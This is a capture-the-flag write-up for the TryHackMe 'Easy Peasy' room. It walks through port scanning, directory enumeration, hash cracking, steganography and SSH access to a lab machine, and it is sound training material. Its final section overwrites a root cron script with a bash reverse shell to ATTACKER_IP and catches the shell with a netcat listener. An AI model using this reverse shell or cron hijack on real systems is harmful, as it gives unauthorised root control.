
# Easy Peasy

Room: https://tryhackme.com/room/easypeasyctf

## Reconnaissance

First, I verified that the target was reachable.

```bash
ping 10.48.133.67
```

Next, I performed a port scan using RustScan.

```bash
rustscan -a 10.48.133.67
```

The scan revealed three open ports:

```text
80/tcp
6498/tcp
65524/tcp
```

To identify the services running on these ports, I performed a more detailed Nmap scan.

```bash
nmap -sC -sV -p80,6498,65524 10.48.133.67
```

Results:

```text
80/tcp    nginx 1.16.1
6498/tcp  OpenSSH 7.6p1
65524/tcp Apache 2.4.43
```


## Flag 1

Since the machine was running a web server, I started directory enumeration.

```bash
gobuster dir -u http://10.48.133.67/ -w /usr/share/wordlists/dirb/common.txt
```

Interesting results:

```text
hidden
robots.txt
```

I continued enumerating the newly discovered directory.

```bash
gobuster dir -u http://10.48.133.67/hidden/ -w /usr/share/wordlists/dirb/common.txt
```

Result:

```text
whatever
```

Visiting:

```text
http://10.48.133.67/hidden/whatever/
```

did not immediately reveal anything.

After viewing the page source, I found a Base64-encoded flag.

Decoding it revealed the first flag.


## Flag 2

Next, I checked the robots file on the Apache service.

```text
http://10.48.133.67:65524/robots.txt
```

Contents:

```text
User-Agent:*
Disallow:/

Robots Not Allowed

User-Agent:a18672860d0510e5ab6699730763b250
Allow:/

This Flag Can Enter But Only This Flag No More Exceptions
```

The string:

```text
a18672860d0510e5ab6699730763b250
```

looked like a hash.

I submitted it to hashes.com and recovered the 2nd flag.


## Flag 3

Visiting:

```text
http://10.48.133.67:65524/
```

and viewing the page source revealed another hidden flag.


## Flag 4

The robots file suggested using the special User-Agent.

I sent a request with the specified User-Agent.

```bash
wget --user-agent="a18672860d0510e5ab6699730763b250" -qO- http://10.48.133.67:65524/
```

The response contained:

```html
<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
```

The string was Base62 encoded.

After decoding it, I obtained the hidden directory required as the fourth flag.


## Flag 5

Inside the hidden directory, I viewed the page source and found a hash.

```text
940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81
```

First I identified possible hash types.

```bash
hashid 940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81
```

Output:

```text
SHA-256
GOST
SHA3-256
...
```

I initially attempted SHA256 but it failed.

Using John with the GOST format successfully cracked the hash.

```bash
john --format=gost hash.txt --wordlist=easypeasy_1596838725703.txt
```

Got the password.


## Flag 6

Inside the hidden directory was an image:

```text
binarycodepixabay.jpg
```

I downloaded the image and extracted the hidden data using Steghide.

```bash
steghide extract -sf binarycodepixabay.jpg
```

Using the previously recovered password:

```text
mypasswordforthatjob
```

Steghide extracted:

```text
secrettext.txt
```

The file contained binary data.

After converting the binary to text, I obtained the SSH password.


## Flag 7

The SSH service was running on port 6498.

I connected using the discovered credentials.

```bash
ssh -p 6498 boring@10.48.133.67
```

After logging in, I found:

```text
user.txt
```

Contents:

```text
synt{a0jvgf33zfa0ez4y}
```

This looked like ROT13.

After decoding:

```text
flag{...}
```

I obtained the user flag.


## Flag 8

The room description hinted at cron jobs, so I began investigating scheduled tasks.

I found an interesting script inside `/var/www`.

```bash
ls -l /var/www/.mysecretcronjob.sh
```

Output:

```text
-rwxr-xr-x 1 boring boring 33 Jun 14 2020 .mysecretcronjob.sh
```

Viewing the contents:

```bash
cat /var/www/.mysecretcronjob.sh
```

```bash
#!/bin/bash
# i will run as root
```

The script was writable by the current user and executed by root through a cron job.

Instead of attempting to copy the root flag, I replaced the script with a reverse shell payload.

```bash
cat > /var/www/.mysecretcronjob.sh << 'EOF'
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
EOF

chmod +x /var/www/.mysecretcronjob.sh
```

On my attacking machine, I started a listener.

```bash
nc -lvnp 4444
```

After waiting for the cron job to execute, I received a root shell.

```text
Connection received on 10.48.133.67
root@kral4-PC:/var/www#
```


Once root access was obtained, I searched the root directory.

```bash
cd /root
ls -la
```

Hidden files revealed:

```text
.root.txt
```

Reading the file:

```bash
cat .root.txt
```

Flag:

```text
flag{...}
```

DONE!!!!!!!!!!!

